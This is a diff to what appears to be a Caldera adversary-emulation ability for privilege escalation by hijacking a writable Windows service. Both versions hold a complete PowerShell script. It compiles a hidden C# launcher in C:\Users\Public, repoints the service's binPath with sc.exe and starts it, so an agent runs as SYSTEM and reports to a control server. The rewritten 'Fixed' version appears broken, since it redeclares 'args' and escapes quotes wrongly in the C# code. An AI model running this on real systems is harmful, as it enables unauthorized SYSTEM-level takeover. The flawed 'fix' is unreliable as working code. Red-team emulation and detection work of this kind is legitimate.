@@ -1,6 +1,6 @@
 - id: f0c1d2e3-a4b5-4c6d-8e7f-9a0b1c2d3e4f
-  name: Privilege Escalation - Service Hijack via Custom C# Launcher
-  description: Compiles and hijacks a vulnerable service to launch a Caldera agent with SYSTEM privileges.
+  name: Privilege Escalation - Service Hijack via Custom C# Launcher (Fixed)
+  description: Hijack a writable service by staging and compiling a SYSTEM-launcher C# executable for a new Caldera agent.
   tactic: privilege-escalation
   technique:
     attack_id: T1574.011
@@ -14,72 +14,30 @@
     windows:
       psh:
         command: |
-          $payloadDirectory = "C:\Users\Public"
-          $csFilePath = "$payloadDirectory\svc-launcher.cs"
-          $exeFilePath = "$payloadDirectory\svc-launcher.exe"
-
-          $agentPath = '#{file.path.agent_exe}' -replace '\\', '\\\\'
-          $serverAddr = '#{server.http.address}'
-
-          $code = @"
-          using System;
-          using System.Diagnostics;
-          using System.Threading;
-
-          namespace SvcLauncher
-          {
-              class Program
-              {
-                  static void Main(string[] args)
-                  {
-                      try
-                      {
-                          string payloadPath = ""$agentPath"";
-                          string payloadArgs = ""-server $serverAddr -group system-pwned"";
-
-                          ProcessStartInfo psi = new ProcessStartInfo
-                          {
-                              FileName = payloadPath,
-                              Arguments = payloadArgs,
-                              UseShellExecute = false,
-                              CreateNoWindow = true,
-                              WindowStyle = ProcessWindowStyle.Hidden
-                          };
-                          Process.Start(psi);
-                      }
-                      catch {}
-                      Thread.Sleep(30000);
-                  }
+          $d="C:\Users\Public"; $cs="$d\svc-launcher.cs"; $exe="$d\svc-launcher.exe"; $a='#{file.path.agent_exe}'.Replace('\','\\'); $s='#{server.http.address}'; $c=@"
+          using System; using System.Diagnostics; using System.Threading;
+          namespace SvcLauncher {
+            class Program {
+              static void Main(string[] args) {
+                try {
+                  string p = \"$a\"; string args = \"-server $s -group system-pwned\";
+                  ProcessStartInfo psi = new ProcessStartInfo {
+                    FileName = p,
+                    Arguments = args,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                  };
+                  Process.Start(psi);
+                } catch {}
+                Thread.Sleep(30000);
               }
+            }
           }
-          "@
-
-          Set-Content -Path $csFilePath -Value $code -Force
-
-          $compilerPaths = @(
-            "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
-            "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
-          )
-          $compilerPath = $compilerPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
-
-          if (-not $compilerPath) {
-              Write-Error "No C# compiler found!"
-              exit
-          }
-
-          & $compilerPath /nologo /out:$exeFilePath $csFilePath
-
-          if (Test-Path $exeFilePath) {
-              sc.exe config "#{service.name.writable}" binPath= "\"$exeFilePath\""
-              Start-Sleep -Seconds 2
-              sc.exe start "#{service.name.writable}"
-              Write-Host "SUCCESS: Compiled and launched C# service hijacker for service '#{service.name.writable}'."
-          } else {
-              Write-Error "FAILURE: Compilation failed."
-          }
+          "@; Set-Content -Path $cs -Value $c -Force; $cscs=@("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe","C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"); $csc=$cscs | ? {Test-Path $_} | Select -First 1; if (-not $csc) {Write-Error "No compiler"} else { & $csc /nologo /out:$exe $cs; if (Test-Path $exe) { sc.exe config "#{service.name.writable}" binPath= "\"$exe\""; Start-Sleep -Seconds 1; sc.exe start "#{service.name.writable}"; Write-Host "SUCCESS: Compiled and launched C# hijacker for '#{service.name.writable}'" } else { Write-Error "Compilation failed" } }
         parsers:
           plugins.adversary_emulation.app.parsers.regex_parser:
             - source: service.hijacked.executable
               custom_parser_vals:
-                regex: "SUCCESS: Compiled and launched C# service hijacker for service '(.*)'"
+                regex: "SUCCESS: Compiled and launched C# hijacker for '(.*)'"
                 edge_label: hijacked_service
